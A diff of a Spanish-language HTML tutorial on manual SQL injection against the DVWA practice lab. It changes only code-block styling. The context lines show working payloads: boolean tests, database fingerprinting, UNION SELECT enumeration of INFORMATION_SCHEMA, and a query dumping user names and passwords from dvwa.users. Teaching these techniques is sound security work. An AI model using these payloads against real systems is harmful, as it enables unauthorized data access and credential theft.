@@ -16,10 +16,10 @@
 <p class='article-paragraph'><img src="./images/2-sqli.png" alt="alt text" /></p>
 <p class='article-paragraph'>Bien, sabiendo esto podemos determinar que si inyectamos una condición booleana después de un identificador válido de usuario, si la condición es verdadera nos devolverá el usuario pero si es falsa no devolverá nada.</p>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>1’ AND 1 = 1;#</code></pre>
+<pre><code class="sql language-sql">1’ AND 1 = 1;#</code></pre>
 <p class='article-paragraph'><img src="./images/3-sqli.png" alt="alt text" /></p>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>1’ AND 1 = 2;#</code></pre>
+<pre><code class="sql language-sql">1’ AND 1 = 2;#</code></pre>
 <p class='article-paragraph'><img src="./images/4-sqli.png" alt="alt text" /></p>
 <p class='article-paragraph'>Ahora podemos usar expresiones del dialecto SQL para determinar el tipo de DBMS al que nos estamos enfrentando. Podemos usar los operadores y funciones de concatenación de cadenas.</p>
 <p class='article-paragraph'>La siguiente tabla la he extraído directamente del libro “Hacking a aplicaciones web: Sql Injection” ya que representa muy bien lo que quiero explicar.</p>
@@ -33,10 +33,10 @@
 <li>Si aplicamos esto, sabiendo que estamos usando un MySQL en nuestras pruebas. Si utilizamos el operador ‘||’ para concatenar cadenas no nos devolverá resultado ya que habrá retornado 0 la consulta. Sin embargo si usamos la función ‘concat’ deberemos de obtener el usuario admin.</li>
 </ul>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>1’ AND ‘a’||’b’ LIKE ‘ab’;#</code></pre>
+<pre><code class="sql language-sql">1’ AND ‘a’||’b’ LIKE ‘ab’;#</code></pre>
 <p class='article-paragraph'><img src="./images/5-sqli.png" alt="alt text" /></p>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>1’ AND concat(‘a’, ‘b’) LIKE ‘ab’;#</code></pre>
+<pre><code class="sql language-sql">1’ AND concat(‘a’, ‘b’) LIKE ‘ab’;#</code></pre>
 <p class='article-paragraph'><img src="./images/6-sqli.png" alt="alt text" /></p>
 <h3 class='article-subtitle'>Extrayendo información de INFORMATION_SCHEMA, el esquema de MySQL.</h3>
 <p class='article-paragraph'>INFORMATION_SCHEMA es el esquema de donde vamos a extraer la información que nos interesa. En realidad es una base de datos como tal que contiene vistas con permisos de solo lectura. La manera de realizar consultas es análoga a la forma en que lo hacemos con una BD normal.</p>
@@ -45,7 +45,7 @@
 <p class='article-paragraph'>Esta vista contiene 5 columnas diferentes pero a nosotros solo nos interesa una: schema_name la cual va a contener el nombre de las BBDD.</p>
 <p class='article-paragraph'>Más información acerca de las diferentes columnas: <a href="https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html">Documentación de MySQL</a></p>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>-1’
+<pre><code class="sql language-sql">-1’
 UNION SELECT schema_name, null
 FROM INFORMATION_SCHEMA.SCHEMATA;#</code></pre>
 <p class='article-paragraph'><img src="./images/7-SQLI.png" alt="alt text" /></p>
@@ -55,7 +55,7 @@ FROM INFORMATION_SCHEMA.SCHEMATA;#</code></pre>
 table</em>name la cual contiene el nombre de la tabla.
 Mas informacion de las diferentes columnas: <a href="https://dev.mysql.com/doc/refman/8.0/en/tables-table.html">Documentación de MySQL</a></p>
 <p class='article-paragraph'>Por lo cual si quisiéramos obtener todas las tablas de una BD inyectamos la siguiente consulta:</p>
-<pre class='article-code'><code>-1’
+<pre><code class="sql language-sql">-1’
 UNION SELECT table_name, null
 FROM INFORMATION_SCHEMA.TABLES
 WHERE table_schema LIKE ‘dvwa’;#</code></pre>
@@ -70,14 +70,14 @@ WHERE table_schema LIKE ‘dvwa’;#</code></pre>
 </ul>
 <p class='article-paragraph'>Más información acerca de las diferentes columnas: <a href="https://dev.mysql.com/doc/refman/8.0/en/columns-table.html">Documentación de MySQL</a></p>
 <p class='article-paragraph'>Por lo tanto, para obtener las diferentes columnas de la tabla users debemos inyectar la siguiente consulta:</p>
-<pre class='article-code'><code>-1’
+<pre><code class="sql language-sql">-1’
 UNION SELECT column_name, column_type
 FROM INFORMATION_SCHEMA.COLUMNS
 WHERE table_schema LIKE ‘dvwa’ AND table_name LIKE ‘users’;#</code></pre>
 <p class='article-paragraph'><img src="./images/10-sqli.png" alt="alt text" /></p>
 <p class='article-paragraph'>Pues ya sabemos la tabla y sus columnas, una vez aquí ya podemos consultar, añadir, eliminar o modificar registros según los permisos que tenga el usuario con el que se realizan las consultas.</p>
 <p class='article-paragraph'>Consulta:</p>
-<pre class='article-code'><code>-1’
+<pre><code class="sql language-sql">-1’
 UNION SELECT user, password
 FROM dvwa.users;#</code></pre>
 <p class='article-paragraph'><img src="./images/11-sqli.png" alt="alt text" /></p>
